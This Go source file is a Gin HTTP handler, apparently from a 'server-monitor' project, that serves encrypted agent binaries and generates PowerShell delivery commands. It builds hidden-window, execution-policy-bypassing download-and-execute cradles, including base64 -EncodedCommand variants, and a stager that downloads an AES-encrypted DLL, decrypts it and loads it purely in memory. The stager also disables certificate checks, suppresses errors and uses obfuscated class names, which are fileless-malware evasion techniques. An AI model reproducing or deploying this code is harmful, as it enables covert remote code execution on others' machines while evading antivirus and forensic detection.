package handler

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"server-monitor/internal/model"
	"strings"

	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
)

// FilelessHandler 无文件载荷分发
type FilelessHandler struct {
	storagePath string
	db          *gorm.DB
}

func NewFilelessHandler(storagePath string, db *gorm.DB) *FilelessHandler {
	return &FilelessHandler{storagePath: storagePath, db: db}
}

func newDeployID() string {
	b := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, b); err != nil {
		return fmt.Sprintf("%d", os.Getpid())
	}
	return base64.RawURLEncoding.EncodeToString(b)
}

// ─── 载荷加密密钥派生 ───
// 盐值由 machineID 反转的 SHA-512 派生，无硬编码字符串
// 每台机器解密密钥不同，截获一台的密钥无法解密另一台的载荷
func derivePayloadKey(machineID string) []byte {
	// salt = SHA-512(reversed machineID)[:16]
	mid := []byte(machineID)
	rev := make([]byte, len(mid))
	for i, b := range mid {
		rev[len(mid)-1-i] = b
	}
	saltHash := sha512.Sum512(rev)
	// key = SHA-256(salt + machineID)
	combined := append(saltHash[:16], mid...)
	h := sha256.Sum256(combined)
	return h[:]
}

// aesEncrypt 使用 AES-256-CBC + PKCS7 加密（兼容 .NET Framework 4.x PowerShell 5.1）
// 输出格式: IV(16) + ciphertext
func aesEncrypt(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	// PKCS7 padding
	padLen := aes.BlockSize - len(data)%aes.BlockSize
	padding := make([]byte, padLen)
	for i := range padding {
		padding[i] = byte(padLen)
	}
	plaintext := append(data, padding...)

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	cbc := cipher.NewCBCEncrypter(block, iv)
	ct := make([]byte, len(plaintext))
	cbc.CryptBlocks(ct, plaintext)

	// IV + ciphertext
	result := make([]byte, len(iv)+len(ct))
	copy(result, iv)
	copy(result[len(iv):], ct)
	return result, nil
}

// Payload 返回 AES-256-GCM 加密的 agent 二进制
// GET /api/agent/payload?os=windows|windows-cs|linux&mid=<machine-id>
func (h *FilelessHandler) Payload(c *gin.Context) {
	osType := c.DefaultQuery("os", "windows-cs")
	mid := c.DefaultQuery("mid", "default")

	var binPath string
	switch osType {
	case "windows-cs":
		binPath = h.storagePath + "/MiniAgent.dll"
	case "windows":
		binPath = h.storagePath + "/agent-windows.exe"
	default:
		binPath = h.storagePath + "/agentlinux"
	}

	data, err := os.ReadFile(binPath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "binary not found"})
		return
	}

	key := derivePayloadKey(mid)
	enc, err := aesEncrypt(data, key)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encryption failed"})
		return
	}

	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", len(enc)))
	c.Writer.Write(enc)
}

// Stager 返回 PowerShell stager 脚本（Assembly.Load 纯内存加载 C# mini-agent）
// GET /api/agent/stager?mid=<machine-id>&token=<agent-token>
// 流程：下载 AES 加密的 C# DLL → 内存解密 → Assembly.Load → Entry.Run()
// 全程零落盘，DLL 仅 ~20KB
func (h *FilelessHandler) Stager(c *gin.Context) {
	mid := c.DefaultQuery("mid", "default")
	agentToken := c.DefaultQuery("token", "")
	deployID := c.DefaultQuery("deployId", "")
	serverURL := fmt.Sprintf("https://%s", c.Request.Host)
	if c.Request.TLS == nil {
		serverURL = fmt.Sprintf("http://%s", c.Request.Host)
	}

	payloadURL := serverURL + "/api/agent/payload?os=windows-cs&mid=" + url.QueryEscape(mid)

	// 派生载荷解密密钥
	key := derivePayloadKey(mid)
	keyB64 := base64.StdEncoding.EncodeToString(key)

	// 获取签名密钥
	signKey := model.GetSignKey(h.db)

	// 读取混淆映射
	obfNS, obfEntry := readObfMapping(h.storagePath)
	script := generatePSStager(payloadURL, keyB64, serverURL, agentToken, signKey, deployID, obfNS, obfEntry)

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, script)
}

// Cradle 返回一行式 PowerShell 入口命令
// GET /api/agent/cradle?mid=<machine-id>
func (h *FilelessHandler) Cradle(c *gin.Context) {
	mid := c.DefaultQuery("mid", "default")
	serverURL := fmt.Sprintf("https://%s", c.Request.Host)
	if c.Request.TLS == nil {
		serverURL = fmt.Sprintf("http://%s", c.Request.Host)
	}

	stagerURL := serverURL + "/api/agent/stager?mid=" + url.QueryEscape(mid)

	// 一行式 cradle：下载 stager 并执行
	cradle := fmt.Sprintf(
		`powershell -ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('%s'))"`,
		stagerURL,
	)

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, cradle)
}

// CradleB64 返回 base64 编码的 cradle（适合 -EncodedCommand 参数）
// GET /api/agent/cradle-b64?mid=<machine-id>
func (h *FilelessHandler) CradleB64(c *gin.Context) {
	mid := c.DefaultQuery("mid", "default")
	serverURL := fmt.Sprintf("https://%s", c.Request.Host)
	if c.Request.TLS == nil {
		serverURL = fmt.Sprintf("http://%s", c.Request.Host)
	}

	stagerURL := serverURL + "/api/agent/stager?mid=" + url.QueryEscape(mid)

	// PowerShell 命令
	psCmd := fmt.Sprintf(
		`[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('%s'))`,
		stagerURL,
	)

	// UTF-16LE 编码后 base64（PowerShell -EncodedCommand 格式）
	utf16 := utf16LEEncode(psCmd)
	b64 := base64.StdEncoding.EncodeToString(utf16)

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, b64)
}

func utf16LEEncode(s string) []byte {
	buf := make([]byte, len(s)*2)
	for i, r := range s {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	return buf
}

// GenerateCradle 管理接口 — 生成无文件下发命令（需 JWT）
// POST /api/agent/fileless-generate
// Body: {"mid": "machine-id", "token": "agent-token"}
// 返回 cradle 一行命令 + base64 版 + stager 脚本，管理员可直接复制到目标机器执行
func (h *FilelessHandler) GenerateCradle(c *gin.Context) {
	var req struct {
		MID   string `json:"mid"`
		Token string `json:"token"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "参数错误"})
		return
	}
	if req.MID == "" {
		req.MID = "default"
	}

	serverURL := fmt.Sprintf("https://%s", c.Request.Host)
	if c.Request.TLS == nil {
		serverURL = fmt.Sprintf("http://%s", c.Request.Host)
	}

	deployID := newDeployID()
	stagerURL := serverURL + "/api/agent/stager?mid=" + url.QueryEscape(req.MID) + "&deployId=" + url.QueryEscape(deployID)
	if req.Token != "" {
		stagerURL += "&token=" + url.QueryEscape(req.Token)
	}

	// 一行式 cradle
	cradle := fmt.Sprintf(
		`powershell -ep bypass -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('%s'))"`,
		stagerURL,
	)

	// Base64 编码版（适合 -EncodedCommand）
	psCmd := fmt.Sprintf(
		`[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX((New-Object Net.WebClient).DownloadString('%s'))`,
		stagerURL,
	)
	utf16 := utf16LEEncode(psCmd)
	b64 := base64.StdEncoding.EncodeToString(utf16)
	encodedCradle := fmt.Sprintf(`powershell -ep bypass -w hidden -EncodedCommand %s`, b64)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"data": gin.H{
			"cradle":        cradle,
			"encodedCradle": encodedCradle,
			"stagerUrl":     stagerURL,
			"mid":           req.MID,
			"deployId":      deployID,
			"note":          "在目标 Windows 机器上以管理员权限运行 cradle 命令即可，全程无文件落盘",
		},
	})
}

// ═══ PowerShell Stager 生成（Assembly.Load 版） ═══

// readObfMapping 读取混淆映射文件，返回 (namespace, entryClass)
func readObfMapping(storagePath string) (string, string) {
	ns, entry := "MiniAgent", "Entry" // 默认未混淆名称
	mapFile := filepath.Join(storagePath, "obf_mapping.txt")
	f, err := os.Open(mapFile)
	if err != nil {
		return ns, entry
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "NAMESPACE=") {
			ns = strings.TrimPrefix(line, "NAMESPACE=")
		} else if strings.HasPrefix(line, "ENTRY_CLASS=") {
			entry = strings.TrimPrefix(line, "ENTRY_CLASS=")
		}
	}
	return ns, entry
}

func generatePSStager(payloadURL, keyB64, serverURL, agentToken, signKey, deployID, obfNS, obfEntry string) string {
	var sb strings.Builder

	// ── 整个 stager 包裹在 try/catch ──
	sb.WriteString(`try {
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
try { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} } catch {}
`)

	sb.WriteString(fmt.Sprintf(`$payloadURL = '%s'
$keyBytes = [Convert]::FromBase64String('%s')
$serverUrl = '%s'
$agentToken = '%s'
$signKey = '%s'
$deployId = '%s'
`, payloadURL, keyB64, serverURL, agentToken, signKey, deployID))

	sb.WriteString(`
$wc = New-Object Net.WebClient
$enc = $wc.DownloadData($payloadURL)

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Key = $keyBytes
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$iv = New-Object byte[] 16
[Array]::Copy($enc, 0, $iv, 0, 16)
$aes.IV = $iv
$ct = New-Object byte[] ($enc.Length - 16)
[Array]::Copy($enc, 16, $ct, 0, $ct.Length)
$dec = $aes.CreateDecryptor()
$dll = $dec.TransformFinalBlock($ct, 0, $ct.Length)
$aes.Dispose()
$asm = [System.Reflection.Assembly]::Load([byte[]]$dll)
`)

	sb.WriteString(fmt.Sprintf(`$entry = $asm.GetType("%s.%s")
`, obfNS, obfEntry))

	sb.WriteString(`$method = $entry.GetMethod("Run")
$method.Invoke($null, @($serverUrl, $agentToken, $signKey, $deployId))
} catch {}
`)

	return sb.String()
}
